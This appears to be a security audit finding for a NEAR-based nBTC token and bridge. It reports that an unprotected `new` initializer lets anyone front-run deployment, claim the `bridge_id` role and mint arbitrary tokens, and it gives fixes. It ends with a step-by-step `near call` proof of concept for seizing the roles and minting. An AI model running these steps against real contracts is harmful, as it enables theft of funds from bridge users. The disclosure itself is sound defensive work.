### Title
Unpermissioned `new` Initializer on `nbtc` Token Contract Allows Front-Running to Seize `bridge_id` and `controller` Roles — (File: `contracts/nbtc/src/lib.rs`)

---

### Summary

The `nbtc` NEP-141 token contract's `new` constructor has no caller access control. Any unprivileged NEAR account can call it before the legitimate deployer, installing themselves as both `controller` and `bridge_id`. Because `bridge_id` is the sole account authorized to call `mint` and `burn`, the attacker gains the ability to mint arbitrary nBTC.

---

### Finding Description

`contracts/nbtc/src/lib.rs` exposes a public `#[init]` function:

```rust
#[init]
pub fn new(
    controller: AccountId,
    bridge_id: AccountId,
    ...
) -> Self {
    require!(!env::state_exists(), "Already initialized");
    ...
}
```

The only guard is `require!(!env::state_exists(), ...)`. There is no check that `env::predecessor_account_id()` equals the account that deployed the WASM, or any other privileged identity. [1](#0-0) 

On NEAR, deploying contract WASM and calling the initializer are two separate transactions. The deployment transaction is visible on-chain the moment it lands in a block; the initializer call is a subsequent, independent transaction. This creates a race window.

The `mint` and `burn` functions are gated exclusively by `assert_bridge()`:

```rust
fn assert_bridge(&self) {
    require!(self.bridge_id == env::predecessor_account_id(), "Not Allow");
}
``` [2](#0-1) 

Whoever controls `bridge_id` in contract state is the sole authorized minter and burner. [3](#0-2) 

The same pattern exists on the `satoshi-bridge` contract's `new`, where `env::predecessor_account_id()` is unconditionally promoted to super-admin and DAO role — also callable by any account before the team. [4](#0-3) 

---

### Impact Explanation

**Critical — Unauthorized minting of nBTC.**

If an attacker front-runs `nbtc::new` and supplies their own account as `bridge_id`:

1. The attacker's account satisfies `assert_bridge()` on every subsequent call.
2. The attacker calls `mint(attacker_account, large_amount, ...)` directly on the nbtc contract, minting arbitrary nBTC to any registered account.
3. If the `satoshi-bridge` is then deployed pointing to this already-initialized nbtc contract (the team may not immediately detect the wrong `bridge_id`), the attacker holds nBTC that the bridge treats as legitimate, and can trigger a withdrawal to redeem real BTC.

Even in the minimal griefing scenario the team must redeploy the nbtc contract, and any bridge state already pointing to the compromised token address must be unwound.

---

### Likelihood Explanation

**Medium.** NEAR block times are approximately one second. An attacker watching the chain for a `DeployContract` action on the nbtc account can submit a `new` call in the very next block. No special privilege, leaked key, or off-chain coordination is required — only a funded NEAR account and a chain-watching script. The deployment and initialization are confirmed to be separate transactions in the project's own test harness. [5](#0-4) [6](#0-5) 

---

### Recommendation

1. **Atomic deploy + init**: Use a NEAR batch transaction that combines `DeployContract` and the `new` function call in a single atomic action. This eliminates the race window entirely.
2. **Caller restriction inside `new`**: Add `require!(env::predecessor_account_id() == env::current_account_id(), "unauthorized");` so only the contract account itself (i.e., the deployer acting through a batch) can initialize it.
3. Apply the same fix to `satoshi-bridge::new`, which has an identical race condition that would hand the attacker the DAO super-admin role. [7](#0-6) 

---

### Proof of Concept

```
# Step 1 – Team deploys nbtc WASM (visible on-chain immediately)
near deploy --accountId nbtc.bridge.near --wasmFile nbtc.wasm

# Step 2 – Attacker observes the DeployContract receipt and races ahead
near call nbtc.bridge.near new \
  '{"controller":"attacker.near","bridge_id":"attacker.near",
    "name":"nBTC","symbol":"nBTC","decimals":8}' \
  --accountId attacker.near

# Step 3 – Team's own init call now fails: "Already initialized"
near call nbtc.bridge.near new '{"controller":"team.near",...}' \
  --accountId team.near
# → panics: "Already initialized"

# Step 4 – Attacker mints arbitrary nBTC (bridge_id == attacker.near)
near call nbtc.bridge.near mint \
  '{"mint_account_id":"attacker.near","mint_amount":"100000000000",
    "protocol_fee":"0","relayer_account_id":"attacker.near",
    "relayer_fee":"0","post_actions":null}' \
  --accountId attacker.near
# → succeeds; attacker now holds 1000 BTC-equivalent nBTC
```
